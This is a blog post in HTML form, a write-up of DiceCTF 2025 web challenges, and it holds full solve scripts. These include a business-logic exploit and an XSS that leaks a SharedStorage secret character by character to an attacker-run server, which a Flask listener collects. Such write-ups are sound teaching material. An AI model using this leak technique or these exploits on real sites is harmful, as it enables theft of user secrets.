@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>DiceCTF 2025 | bigbluewhale111&#39;s blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Writeup for some web challenge for DiceCTF 2025">
+<meta name="author" content="">
+<link rel="canonical" href="https://blog.bigbluewhale111.me/writeups/dicectf2025/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://blog.bigbluewhale111.me/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://blog.bigbluewhale111.me/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://blog.bigbluewhale111.me/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://blog.bigbluewhale111.me/apple-touch-icon.png">
+<link rel="mask-icon" href="https://blog.bigbluewhale111.me/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://blog.bigbluewhale111.me/writeups/dicectf2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://blog.bigbluewhale111.me/writeups/dicectf2025/">
+  <meta property="og:site_name" content="bigbluewhale111&#39;s blog">
+  <meta property="og:title" content="DiceCTF 2025">
+  <meta property="og:description" content="Writeup for some web challenge for DiceCTF 2025">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-04-17T09:48:00+07:00">
+    <meta property="article:modified_time" content="2025-04-17T09:48:00+07:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DiceCTF 2025">
+<meta name="twitter:description" content="Writeup for some web challenge for DiceCTF 2025">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "DiceCTF 2025",
+      "item": "https://blog.bigbluewhale111.me/writeups/dicectf2025/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "DiceCTF 2025",
+  "name": "DiceCTF 2025",
+  "description": "Writeup for some web challenge for DiceCTF 2025",
+  "keywords": [
+    
+  ],
+  "articleBody": "TL;DR This is a writeup for some web challenge for DiceCTF 2025\ncookie-recipes-v3 This challenge was about a trick in javascript: (NaN \u003c 1_000_000_000) == false. So by passing any “number” that make Number(number) return NaN, I got the flag.\npyramid Looking at the problem, a crazy idea came to my mind which is trying to make 100.000.000.000 users and refer to the target user to get the flag. But that seemed impossible.\nThe flaw in the logic was:\napp.get(\"/cashout\", (req, res) =\u003e { if (req.user) { const u = req.user; const r = referrer(u.code); if (r) { [u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2]; } else { [u.ref, u.bal] = [0, u.bal + u.ref]; } } res.redirect(\"/\"); }); This seemed to be safe and balance, but when u and r are the same user, given u.ref = A, then:\nu.ref = 0 u.ref = A + A/2 = 1.5*A u.bal += 0.5*A In this case, it seemed that u.ref is increase in exponential manner =\u003e reaching 100.000.000.000 is possible in a few iterations. But how to do so? Looking at /new endpoint, I noticed that it collected the body data in a weird manner:\napp.post(\"/new\", (req, res) =\u003e { const token = random(); const body = []; req.on(\"data\", Array.prototype.push.bind(body)); req.on(\"end\", () =\u003e { const data = Buffer.concat(body).toString(); console.log(\"Received data\", data); const parsed = new URLSearchParams(data); const name = parsed.get(\"name\")?.toString() ?? \"JD\"; const code = parsed.get(\"refer\") ?? null; // referrer receives the referral const r = referrer(code); if (r) { r.ref += 1; } console.log(\"Creating user\", name, code, r); users.set(token, { name, code, ref: 0, bal: 0, }); }); res.header(\"set-cookie\", `token=${token}`); res.redirect(\"/\"); }); So by sending a POST request to /new without a complete body, we can get the token, then make a reference code from that token, then finish the request’s body with refer is our own token. I chose Transfer-Encoding: chunked as normal Content-Type: application/x-form-urlencoded needs Content-Length which is calculatable but I was too lazy to do so.\nconst net = require(\"net\"); const host = \"localhost\"; const port = 3000; const new_path = \"/new\"; const code_path = \"/code\"; const home_path = \"/\"; const cashout_path = \"/cashout\"; const buy_path = \"/buy\"; var token = \"\"; const new_socket = net.createConnection(port, host, () =\u003e { new_socket.write( `POST ${new_path} HTTP/1.1\\r\\n` + `Host: ${host}\\r\\n` + `Transfer-Encoding: chunked\\r\\n\\r\\n` ); }); const get_code = async (token) =\u003e { const res = await fetch(`http://${host}:${port}${code_path}`, { headers: { Cookie: `token=${token}` }, }); const text = await res.text(); const code = text.split(\"\")[1].split(\"\")[0].trim(); return code; }; const create_referer = async (code) =\u003e { const res = await fetch(`http://${host}:${port}${new_path}`, { method: \"POST\", body: `name=testtesttest\u0026refer=${code}`, }); return; }; const make_bail = async (token) =\u003e { const res = await fetch(`http://${host}:${port}${cashout_path}`, { headers: { Cookie: `token=${token}` }, }); return; }; const get_home = async (token) =\u003e { const res = await fetch(`http://${host}:${port}${home_path}`, { headers: { Cookie: `token=${token}` }, }); const text = await res.text(); return text; }; const buy_flag = async (token) =\u003e { const res = await fetch(`http://${host}:${port}${buy_path}`, { headers: { Cookie: `token=${token}` }, }); const text = await res.text(); return text; }; new_socket.on(\"data\", async (data) =\u003e { const res = data.toString(); console.log(res); token = res.split(\"token=\")[1].split(\"\\n\")[0].trim(); console.log(\"token: \" + token); const code = await get_code(token); const send_data = `name=testtesttest\u0026refer=${code}`; new_socket.end( send_data.length.toString(16) + \"\\r\\n\" + send_data + \"\\r\\n0\\r\\n\\r\\n\" ); create_referer(code); for (let i = 0; i \u003c 65; i++) { await make_bail(token); } const home = await get_home(token); console.log(\"[HOME REQ]: \" + home); const flag = await buy_flag(token); console.log(\"[FLAG REQ]: \" + flag); }); new_socket.on(\"end\", () =\u003e { console.log(\"[New Socket]: Connection closed by server.\"); }); new_socket.on(\"error\", (err) =\u003e { console.error(\"[New Socket]: TLS Socket Error:\", err); }); // ChatGPT help me proxy from http://localhost:3000 to https://pyramid.dicec.tf:443 by socat TCP-LISTEN:3000,reuseaddr,fork SSL:pyramid.dicec.tf:443,verify=0 nobin This was an XSS challenge. The endpoint for XSS was given at /xss but the main thing here was that the secret for the flag was put in SharedStorage, which can only be access from restricted sources. Reading this docs, I knew that: you can only read shared storage data from inside a worklet and Output gates are URL Selection and Run. I chose the URL Selection as the run was kinda hard to understand.\nAbout the URL Selection, after passed in urls, the selectURL would return the URL with index that return by the worklet. And base on my own testing, I could pass in around 7 urls.\nAfter a while of trials and errors, I came up with this kinda crazy ideas:\nconst alphabet = \"0123456789abcdef\"; const l = 6; const count = Math.ceil(alphabet.length / l); const solve = async () =\u003e { await sharedStorage.worklet.addModule(\"SERVER_URL/module.js\"); const truncated_alphabet = alphabet.slice(l * k, l * (k + 1)); console.log(truncated_alphabet); const urls = [ { url: `SERVER_URL/secret?index=${j}${k}0`, }, ]; for (let i = 0; i \u003c truncated_alphabet.length; i++) { urls.push({ url: `SERVER_URL/secret?secret=${truncated_alphabet[i]}\u0026index=${j}`, }); } // console.log(urls); sharedStorage .selectURL(\"exploit\", urls, { resolveToConfig: true, data: { index: j, alphabet: truncated_alphabet }, keepAlive: true, }) .then( (config) =\u003e { if (config) { document.querySelector(\"#my-frame\").config = config; } }, (err) =\u003e { console.error(err); } ); }; window.onload = () =\u003e { const frame = document.createElement(\"fencedframe\"); frame.id = \"my-frame\"; document.body.append(frame); solve(); setTimeout(() =\u003e { if (j \u003e= 16 || k \u003e= count) { return; } fetch(`SERVER_URL/ok?index=${j}`) .then((res) =\u003e res.text()) .then((text) =\u003e { if (text == \"OK\") { location.href = `/xss?xss=`; } else { location.href = `/xss?xss=`; } }); }, 1000); }; I had to set the location.href as sharedStorage.selectURL was kinda broken on second called. The idea was simple, I leaked each character of secret via the URL selection, and if the character was correct, it called back to my SERVER_URL with the character. I hosted the module.js as follow:\nclass Exploit { async run(urls, data) { const secret = await sharedStorage.get(\"message\"); if (!secret) { return 0; } const charCode = secret[data.index]; if (!charCode) { return 0; } const alphabet = data.alphabet; const index = alphabet.indexOf(charCode); console.log(\"index: \", index, \"urls length: \", urls.length); return (index + 1) % urls.length; } } register(\"exploit\", Exploit); and hosted the server with:\nfrom flask import Flask, request, Response from flask_cors import CORS import sys app = Flask(__name__) CORS(app) # I had to set the CORS, otherwise the browser would not run the JavaScript code secret_data = ['']*100 # I first forgot how long the secret be :) server_url = sys.argv[1] if len(sys.argv) \u003e 1 else 'http://localhost:5000' @app.route('/solve.js') def solve_js(): with open('solve.js', 'r') as file: js_code = file.read() js_code = js_code.replace('SERVER_URL', server_url) return Response(js_code, mimetype='application/javascript') @app.route('/module.js') def module_js(): with open('module.js', 'r') as file: js_code = file.read() return Response(js_code, mimetype='application/javascript') @app.route('/secret') def secret(): if (request.args.get('secret', None) is None or request.args.get('index', None) is None): return \"Missing parameters\", 400 secret_character = request.args.get('secret') index = int(request.args.get('index')) print(f\"Received secret character: {secret_character} at index {index}\", flush=True) if 0 \u003c= index \u003c len(secret_data): secret_data[index] = secret_character else: print(f\"Index {index} out of range\", flush=True) print(f\"Secret data updated: {''.join(secret_data)}\", flush=True) return \"OK\", 200 @app.route('/ok') def ok(): index = int(request.args.get('index')) if index \u003c 0 or index \u003e= len(secret_data): return \"Index out of range\", 400 if secret_data[index] == '': return \"Secret not set\", 400 return \"OK\", 200 app.run(host='0.0.0.0', port=5000) And after making GET request to /xss?xss=, I eventually got the secret and then the flag.\nbad-chess-challenge This challenge was about SMTP. Nothing about web exploitation, plain SMTP with S/MIME which made me suffer a lot. Sometimes, I could sign but then it returned invalid signature. After a lot of trials and errors, I came up with my own STMP client (a simple one, kinda insecure, but simple enough to be able to send raw data).\nconst net = require(\"net\"); const EventEmitter = require(\"events\"); class My_SMTP_Client { stage = 0; socket = null; constructor( host, port, from, to, subject, data, email_parsed = false, debug = false ) { this.host = host; this.port = port; this.from = from; this.to = to; this.subject = subject; this.data = data; this.emitter = new EventEmitter(); this.email_parsed = email_parsed; this.debug = debug; this.socket = net.createConnection( { port: port, host: host }, () =\u003e {} ); this.socket.on(\"data\", (data) =\u003e { const ret_data = data.toString(); if (this.debug) { console.log(\"Received data: \", ret_data); } switch (this.stage) { case 0: if (ret_data.indexOf(\"220\") !== -1) { this.HELO(); this.stage++; break; } this.emitter.emit(\"error\", \"[HELO] Error: \" + ret_data); break; case 1: if (ret_data.indexOf(\"250\") !== -1) { this.MAIL_FROM(); this.stage++; break; } this.emitter.emit( \"error\", \"[MAIL FROM] Error: \" + ret_data ); break; case 2: if (ret_data.indexOf(\"250\") !== -1) { this.RCPT_TO(); this.stage++; break; } this.emitter.emit(\"error\", \"[RCPT TO] Error: \" + ret_data); break; case 3: if (ret_data.indexOf(\"250\") !== -1) { this.DATA(); this.stage++; break; } this.emitter.emit(\"error\", \"[DATA] Error: \" + ret_data); break; case 4: if (ret_data.indexOf(\"354\") !== -1) { this.send_DATA(); this.stage++; break; } this.emitter.emit( \"error\", \"[SEND DATA] Error: \" + ret_data ); break; case 5: if (ret_data.indexOf(\"250\") !== -1) { const ret = ret_data.replace(/250[-\\s]/g, \"\"); this.socket.end(); this.ret = ret; this.emitter.emit(\"data\", ret); break; } this.emitter.emit( \"error\", \"[RECV DATA] Error: \" + ret_data ); break; default: console.log(\"Unknown stage\"); break; } }); this.socket.on(\"error\", (err) =\u003e { this.emitter.emit(\"error\", err); }); this.socket.on(\"end\", () =\u003e { this.emitter.emit(\"end\"); }); } on(event, handler) { this.emitter.on(event, handler); return this; } async HELO() { if (!this.socket) { console.error(\"Socket not initialized\"); return; } await this.socket.write(`HELO ${this.host}\\r\\n`); } async MAIL_FROM() { if (!this.socket) { console.error(\"Socket not initialized\"); return; } await this.socket.write(`MAIL FROM:\u003c${this.from}\u003e\\r\\n`); } async RCPT_TO() { if (!this.socket) { console.error(\"Socket not initialized\"); return; } await this.socket.write(`RCPT TO:\u003c${this.to}\u003e\\r\\n`); } async DATA() { if (!this.socket) { console.error(\"Socket not initialized\"); return; } await this.socket.write(`DATA\\r\\n`); } async send_DATA() { if (!this.socket) { console.error(\"Socket not initialized\"); return; } var data; if (this.email_parsed) { data = this.data + \"\\r\\n.\\r\\n\"; } else { data = `From: \u003c${this.from}\u003e\\r\\nTo: \u003c${this.to}\u003e\\r\\n${ this.subject ? \"Subject: \" + this.subject : \"\" }\\r\\n\\r\\n${this.data}\\r\\n.\\r\\n`; } await this.socket.write(data); } } exports.My_SMTP_Client = My_SMTP_Client; And here is the logic of solving the challenge:\nconst { My_SMTP_Client } = require(\"./my_smpt\"); const fs = require(\"fs\"); const child_process = require(\"child_process\"); const host = \"localhost\"; const port = 2525; const register_client = new My_SMTP_Client( host, port, \"testtest@chess\", \"register@chess\", \"Register\", \"test\" ); register_client .on(\"data\", (data) =\u003e { // console.log(\"Data received:\", data); const keys = data.split(\"\\r\\n\\r\\n\"); fs.writeFileSync(\"private.pem\", keys[0]); fs.writeFileSync(\"public.pem\", keys[1]); child_process.execSync( \"./create_mail.py --from '' --to '' --cert public.pem --key private.pem --out test1.eml --text e4\" ); child_process.execSync( \"./create_mail.py --from '' --to '' --cert public.pem --key private.pem --attach test1.eml --out test2.eml --text f5\" ); child_process.execSync( \"./create_mail.py --from '' --to '' --cert public.pem --key private.pem --attach test2.eml --out test3.eml --text Nc3\" ); child_process.execSync( \"./create_mail.py --from '' --to '' --cert public.pem --key private.pem --attach test3.eml --out test4.eml --text g5\" ); child_process.execSync( \"./create_mail.py --from '' --to '' --cert public.pem --key private.pem --attach test4.eml --out test5.eml --text Qh5\" ); const play_data = fs.readFileSync(\"test5.eml\", \"utf-8\"); // console.log(\"play_data\", play_data); const play_client = new My_SMTP_Client( host, port, \"testtest@chess\", \"admin@chess\", \"Play\", play_data, true, true ); play_client .on(\"data\", (data) =\u003e { console.log(\"Data received:\", data); }) .on(\"error\", (err) =\u003e { console.error(\"Error:\", err); }) .on(\"end\", () =\u003e { console.log(\"Connection ended\"); }); }) .on(\"error\", (err) =\u003e { console.error(\"Error:\", err); }) .on(\"end\", () =\u003e { console.log(\"Connection ended\"); }); I think openssl can do this too, but I am not familiar of using openssl so I wrote a simple python script to sign the S/MIME to my liking:\n#!/usr/bin/python3 import argparse import smail from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText from email.mime.application import MIMEApplication def main(): parser = argparse.ArgumentParser(description=\"Send S/MIME signed email with attachment\") parser.add_argument(\"--from\", dest=\"sender\", required=True, help=\"Sender email address\") parser.add_argument(\"--to\", dest=\"recipient\", required=True, help=\"Recipient email address\") parser.add_argument(\"--subject\", help=\"Email subject\", default=\"Test mail\") parser.add_argument(\"--text\", required=True, help=\"Plain text body\") parser.add_argument(\"--attach\", help=\"Attachment filename\", default=None) parser.add_argument(\"--cert\", required=True, help=\"Path to cert.pem\") parser.add_argument(\"--key\", required=True, help=\"Path to key.pem\") parser.add_argument(\"--out\", required=True, help=\"Output filename\") args = parser.parse_args() # Build the message msg = MIMEMultipart() msg[\"From\"] = args.sender msg[\"To\"] = args.recipient msg[\"Subject\"] = args.subject # Add text msg.attach(MIMEText(args.text, \"plain\")) # Add attachment if args.attach: try: with open(args.attach, \"r\") as f: part = MIMEText(f.read(), \"plain\") part.add_header(\"Content-Disposition\", \"attachment\", filename=\"move.txt\") msg.attach(part) except FileNotFoundError: print(f\"Attachment file {args.attach} not found.\") exit(1) try: with open(args.cert, \"r\") as f: cert = f.read() except FileNotFoundError: print(f\"Certificate file {args.cert} not found.\") exit(1) try: with open(args.key, \"r\") as f: key = f.read() except FileNotFoundError: print(f\"Key file {args.key} not found.\") exit(1) mail = smail.sign_message(msg, key.encode(), cert.encode()).as_string() with open(args.out, \"w\") as f: f.write(mail) print(f\"Signed email saved to {args.out}\") if __name__ == \"__main__\": main() Run the javascript script would give the flag.\ndicepass I haven’t solved this challenge yet, as I am working on the comlink stuff as I think I could get the window.dicepass to return things in the context, I am wondering if I could access other thing beside that.\n",
+  "wordCount" : "2071",
+  "inLanguage": "en",
+  "datePublished": "2025-04-17T09:48:00+07:00",
+  "dateModified": "2025-04-17T09:48:00+07:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://blog.bigbluewhale111.me/writeups/dicectf2025/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "bigbluewhale111's blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://blog.bigbluewhale111.me/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://blog.bigbluewhale111.me/" accesskey="h" title="bigbluewhale111&#39;s blog (Alt + H)">bigbluewhale111&#39;s blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://blog.bigbluewhale111.me/blogs/" title="Blogs">
+                    <span>Blogs</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.bigbluewhale111.me/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://blog.bigbluewhale111.me/">Home</a></div>
+    <h1 class="post-title entry-hint-parent">
+      DiceCTF 2025
+    </h1>
+    <div class="post-description">
+      Writeup for some web challenge for DiceCTF 2025
+    </div>
+    <div class="post-meta"><span title='2025-04-17 09:48:00 +0700 +07'>April 17, 2025</span>&nbsp;·&nbsp;<span>10 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#tldr" aria-label="TL;DR">TL;DR</a></li>
+                <li>
+                    <a href="#cookie-recipes-v3" aria-label="cookie-recipes-v3">cookie-recipes-v3</a></li>
+                <li>
+                    <a href="#pyramid" aria-label="pyramid">pyramid</a></li>
+                <li>
+                    <a href="#nobin" aria-label="nobin">nobin</a></li>
+                <li>
+                    <a href="#bad-chess-challenge" aria-label="bad-chess-challenge">bad-chess-challenge</a></li>
+                <li>
+                    <a href="#dicepass" aria-label="dicepass">dicepass</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="tldr">TL;DR<a hidden class="anchor" aria-hidden="true" href="#tldr">#</a></h2>
+<p>This is a writeup for some web challenge for DiceCTF 2025</p>
+<h2 id="cookie-recipes-v3">cookie-recipes-v3<a hidden class="anchor" aria-hidden="true" href="#cookie-recipes-v3">#</a></h2>
+<p>This challenge was about a trick in javascript: <code>(NaN &lt; 1_000_000_000) == false</code>.
+So by passing any &ldquo;number&rdquo; that make <code>Number(number)</code> return <code>NaN</code>, I got the flag.</p>
+<h2 id="pyramid">pyramid<a hidden class="anchor" aria-hidden="true" href="#pyramid">#</a></h2>
+<p>Looking at the problem, a crazy idea came to my mind which is trying to make 100.000.000.000 users and refer to the target user to get the flag. But that seemed impossible.</p>
+<p>The flaw in the logic was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/cashout&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">u</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">referrer</span>(<span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">code</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">r</span>) {
+</span></span><span style="display:flex;"><span>            [<span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">ref</span>, <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">ref</span>, <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">bal</span>] <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">ref</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">ref</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">bal</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">ref</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            [<span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">ref</span>, <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">bal</span>] <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">bal</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">ref</span>];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>This seemed to be safe and balance, but when u and r are the same user, given <code>u.ref = A</code>, then:</p>
+<ol>
+<li><code>u.ref = 0</code></li>
+<li><code>u.ref = A + A/2 = 1.5*A</code></li>
+<li><code>u.bal += 0.5*A</code></li>
+</ol>
+<p>In this case, it seemed that <code>u.ref</code> is increase in exponential manner =&gt; reaching 100.000.000.000 is possible in a few iterations.
+But how to do so? Looking at <code>/new</code> endpoint, I noticed that it collected the body data in a weird manner:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/new&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">random</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;data&#34;</span>, Array.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">push</span>.<span style="color:#a6e22e">bind</span>(<span style="color:#a6e22e">body</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;end&#34;</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>(<span style="color:#a6e22e">body</span>).<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Received data&#34;</span>, <span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parsed</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;name&#34;</span>)<span style="color:#f92672">?</span>.<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">??</span> <span style="color:#e6db74">&#34;JD&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;refer&#34;</span>) <span style="color:#f92672">??</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// referrer receives the referral
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">referrer</span>(<span style="color:#a6e22e">code</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">r</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">ref</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Creating user&#34;</span>, <span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">code</span>, <span style="color:#a6e22e">r</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">users</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">token</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">name</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">code</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ref</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">bal</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
